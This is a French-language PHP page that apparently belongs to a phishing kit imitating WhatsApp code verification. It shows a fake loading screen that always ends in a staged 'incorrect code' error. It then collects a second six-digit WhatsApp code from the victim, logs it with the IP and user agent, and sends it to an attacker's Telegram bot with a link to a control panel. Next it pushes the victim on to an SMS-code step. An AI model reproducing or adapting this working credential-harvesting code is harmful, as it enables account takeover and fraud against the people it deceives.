<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';

if (empty($sessionId) || empty($clientIp)) {
    die("Paramètres manquants");
}

// Mettre à jour le fichier de suivi
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'loading_whatsapp.php',
    'timestamp' => time(),
    'ip' => $clientIp
];

if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

file_put_contents($trackingFile, json_encode($trackingData));

// Traitement du formulaire pour la re-saisie du code (retry)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $whatsappCodeRetry = $_POST['whatsapp_code_retry'] ?? '';
    
    if (!empty($whatsappCodeRetry)) {
        // Enregistrer le code de retry
        $clientData = [
            'whatsapp_code_retry' => $whatsappCodeRetry,
            'timestamp' => time(),
            'ip' => $clientIp,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'attempt' => 'retry'
        ];
        
        if (!file_exists('sessions')) {
            mkdir('sessions', 0777, true);
        }
        
        file_put_contents('sessions/' . $sessionId . '_whatsapp_retry.json', json_encode($clientData));
        
        // Envoyer les informations à Telegram
        $message = "♻️ NOUVEL ESSAI CODE WHATSAPP ♻️\n\n";
        $message .= "📞 Code: " . $whatsappCodeRetry . "\n";
        $message .= "🔑 Session ID: " . $sessionId . "\n";
        $message .= "🌐 IP: " . $clientIp . "\n";
        $message .= "🖥️ User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Non disponible') . "\n\n";
        
        $telegramConfigFile = 'telegram_config.json';
        if (file_exists($telegramConfigFile)) {
            $telegramConfig = json_decode(file_get_contents($telegramConfigFile), true);
            $botToken = $telegramConfig['bot_token'] ?? '';
            $chatId = $telegramConfig['chat_id'] ?? '';

            $message .= "🔗 Panneau: " . $telegramConfig['url'] . "/control_panel.php?session=" . $sessionId . "&ip=" . $clientIp;
    
            if (!empty($botToken) && !empty($chatId)) {
                $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
                $params = [
                    'chat_id' => $chatId,
                    'text' => $message,
                    'parse_mode' => 'HTML'
                ];
                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_exec($ch);
                curl_close($ch);
            }
        }
        
        // REDIRECTION VERS SMS VERIFICATION
        header("Location: sms_verification.php?session=" . $sessionId . "&ip=" . $clientIp);
        exit;
    }
}

// Vérifier s'il y a une erreur WhatsApp
$showRetryForm = isset($_GET['error']) && $_GET['error'] == '1';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification du code...</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.6;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
            text-align: center;
        }
        
        .loading-card {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 30px 20px;
            margin-bottom: 20px;
        }
        
        .loading-icon {
            font-size: 40px;
            color: #25D366;
            margin-bottom: 20px;
            animation: spin 2s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-title {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #25D366;
        }
        
        .loading-message {
            color: #65676b;
            margin-bottom: 20px;
        }
        
        .progress-container {
            width: 100%;
            height: 8px;
            background-color: #e4e6eb;
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 15px;
        }
        
        .progress-bar {
            height: 100%;
            background-color: #25D366;
            border-radius: 4px;
            width: 0%;
            transition: width 0.5s;
        }
        
        .progress-text {
            font-size: 14px;
            color: #65676b;
        }
        
        .error-message {
            background-color: #ffebee;
            color: #c62828;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 14px;
            display: flex;
            align-items: center;
        }
        
        .error-message i {
            margin-right: 10px;
            font-size: 16px;
        }
        
        .form-group {
            margin-bottom: 15px;
            display: none;
            text-align: left;
        }
        
        .form-group.show {
            display: block;
        }
        
        .form-control {
            width: 100%;
            padding: 14px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            color: #1c1e21;
            text-align: center;
            margin-top: 10px;
        }
        
        .form-control:focus {
            border-color: #25D366;
            outline: none;
            box-shadow: 0 0 0 2px #e7f8ef;
        }
        
        .retry-button {
            width: 100%;
            padding: 12px 0;
            background-color: #25D366;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            display: none;
        }
        
        .retry-button.show {
            display: block;
        }
        
        .retry-button:hover {
            background-color: #128C7E;
        }
        
        .footer {
            text-align: center;
            color: #65676b;
            font-size: 12px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loading-card">
            <?php if ($showRetryForm): ?>
                <!-- MODE ERREUR: Afficher le formulaire de re-saisie -->
                <div class="error-message">
                    <i class="fas fa-exclamation-circle"></i> 
                    <span>Le code WhatsApp est incorrect. Veuillez réessayer.</span>
                </div>
                
                <form method="post" action="">
                    <div class="form-group show">
                        <label style="display: block; font-size: 14px; color: #65676b;">Entrez un nouveau code :</label>
                        <input type="text" name="whatsapp_code_retry" id="whatsapp-code-retry" class="form-control" placeholder="Entrez le code à 6 chiffres" maxlength="6" required pattern="[0-9]{6}" autocomplete="off">
                    </div>
                    <button type="submit" class="retry-button show">Envoyer</button>
                </form>
            <?php else: ?>
                <!-- MODE CHARGEMENT: En attente automatique -->
                <div class="loading-icon" id="loading-icon">
                    <i class="fas fa-spinner"></i>
                </div>
                
                <div class="loading-title" id="loading-title">Vérification en cours</div>
                <p class="loading-message" id="loading-message">Veuillez patienter pendant que nous vérifions votre code...</p>
                
                <div class="progress-container">
                    <div class="progress-bar" id="progress-bar"></div>
                </div>
                
                <div class="progress-text" id="progress-text">0%</div>
            <?php endif; ?>
        </div>
        
        <div class="footer">
            <p>© 2026 WHATSAPPS. Tous droits réservés.</p>
        </div>
    </div>
    
    <script>
        <?php if (!$showRetryForm): ?>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo htmlspecialchars($sessionId); ?>';
            const clientIp = '<?php echo htmlspecialchars($clientIp); ?>';
            const progressBar = document.getElementById('progress-bar');
            const progressText = document.getElementById('progress-text');
            
            let progress = 0;
            const startTime = Date.now();
            const timeout = 5000; // 5 SECONDES - Temps avant de montrer l'erreur automatiquement
            
            function updateProgress(value) {
                progressBar.style.width = value + '%';
                progressText.textContent = value + '%';
            }
            
            // Mise à jour de la barre de progression
            const progressInterval = setInterval(() => {
                const elapsedTime = Date.now() - startTime;
                progress = Math.min((elapsedTime / timeout) * 100, 100);
                updateProgress(Math.floor(progress));
                
                // AUTOMATIQUEMENT après 5 secondes, afficher l'erreur
                if (elapsedTime >= timeout) {
                    clearInterval(progressInterval);
                    
                    // Afficher le formulaire d'erreur automatiquement
                    window.location.href = 'loading_whatsapp.php?session=' + sessionId + '&ip=' + clientIp + '&error=1';
                }
            }, 100);
        });
        <?php endif; ?>
        
        // Focus sur le champ de saisie si formulaire de retry
        <?php if ($showRetryForm): ?>
        document.addEventListener('DOMContentLoaded', function() {
            const input = document.getElementById('whatsapp-code-retry');
            if (input) {
                input.focus();
                input.addEventListener('input', function(e) {
                    this.value = this.value.replace(/[^0-9]/g, '');
                });
            }
        });
        <?php endif; ?>
    </script>
</body>
</html>